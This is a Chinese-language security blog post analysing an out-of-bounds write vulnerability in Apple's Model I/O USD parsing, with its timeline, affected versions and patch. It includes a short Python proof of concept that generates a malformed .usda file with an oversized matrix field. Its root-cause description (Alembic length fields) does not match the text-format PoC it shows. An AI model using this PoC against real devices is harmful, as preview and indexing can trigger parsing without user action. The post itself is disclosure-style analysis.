---
title: Apple Model I/O再爆USD越界写入漏洞
url: https://mp.weixin.qq.com/s/WzVM5cuPnmFm4WZItCRmJw
source: Doonsec's feed
date: 2026-07-10
fetch_date: 2026-07-11T04:58:44.857587
---

# Apple Model I/O再爆USD越界写入漏洞

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/dscLuiaicVquODuXRIOmsJt92CNu3ibzF2pk01hJugib9ebyNf6JeU3jjIJmdiaZK8ZRv721zV1DoWQ6EDcnwkmkdicEwvADAZUKqOKTfqDoycTuU/0?wx_fmt=jpeg)

# Apple Model I/O再爆USD越界写入漏洞

原创

Only
Only

船山信安

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

## 漏洞背景

Apple又修了一个USD文件的越界写入漏洞，它的来源是Pixar搞出来的场景描述语言，3D图形和AR内容交换的工业标准。

Apple在iOS、macOS、visionOS全线产品里都内置了Model I/O框架来解析它，组件libusd\_ms是这次触发漏洞的源头。

## 越界写入的触发点

从ZDI的公告和Apple安全更新日志交叉来看，漏洞落在Model I/O框架处理Alembic文件的路径上。Alembic是USD生态里的一个开放交换格式，专门用来存储和传输复杂的3D场景数据，几何体、摄像机、材质、动画曲线全在里面。它的二进制存储有两种后端，Ogawa和HDF5，文件内部以层级化的OObject树组织，每个OObject带有若干Property，Property的值可以是标量也可以是变长数组。

问题就出在解析这些Property值的时候。libusd\_ms在从Alembic二进制流里读出Property的数据长度字段后，没有对这个长度做充分校验，直接用它来分配缓冲区或做memcpy。攻击者在文件里写入一个远超实际分配大小的长度值，解析器直接写入溢出预定缓冲区。

## 不止于双击打开

USD文件在macOS上不只是双击打开才会被解析，Quick Look预览、Spotlight索引、Finder缩略图生成，都会经过Model I/O框架。也就是说，一个恶意的.usd或.abc文件只要出现在磁盘上，用户甚至不用主动打开它，系统后台就可能已经触发了解析路径。

## 畸形USD文件构造

真实POC来自ipbuf.com的安全研究页面，核心思路是用Python生成一个畸形USD文件，在矩阵字段注入超大字符串。

```
#!/usr/bin/env python3
def generate_malicious_usd_file(filename):
    header = b'#usda 1.0\n\n'
    malicious_data = (
        b'def "TestStage" {\n'
        b'  token test_attr = "test_value"\n'
        b'  def "Nested" {\n'
        b'    matrix4d test_matrix = \n'
        b'    (' + b'A' * 10000 + b')\n'
        b'  }\n'
        b'}\n'
    )
    with open(filename, 'wb') as f:
        f.write(header + malicious_data)
    print(f"[+] Malicious USD file generated: {filename}")

if __name__ == "__main__":
    generate_malicious_usd_file("CVE-2026-20616_malicious.usd")
```

## 矩阵字段溢出

usda是USD的文本表示格式，第一行#usda 1.0声明版本号。然后定义了一个TestStage根prim，嵌套了一个子prim Nested，里面声明了一个matrix4d类型的属性test\_matrix。正常matrix4d应该是一对括号里16个浮点数的排列，这里直接灌了10000个A字符进去。解析器在读到这个字段时，试图把这一万个字节解析进预留给矩阵的内存区域，越界就发生了。

## 修复时间线与补丁

ZDI研究员Michael DePlante早在2025年11月19日就报给了Apple，拖到2026年2月11日才在macOS Sonoma 14.8.4和Tahoe 26.3里修掉，整了将近三个月。Apple的修复手段很常规，改进了边界检查逻辑，确保写操作不会超出分配缓冲区的范围。

## 受影响版本

受影响的产品线包括iOS和iPadOS 18.7.5之前、macOS Sonoma 14.8.4之前、macOS Tahoe 26.3之前、visionOS 26.3之前的所有版本。升级到最新版即可修复。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP80khZp3raYsnCBL854MQ5ouD4zwyygRyXGlvOFEsx69v1ml1s65gia6wwql6v17n12j2CXZibO0ZA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过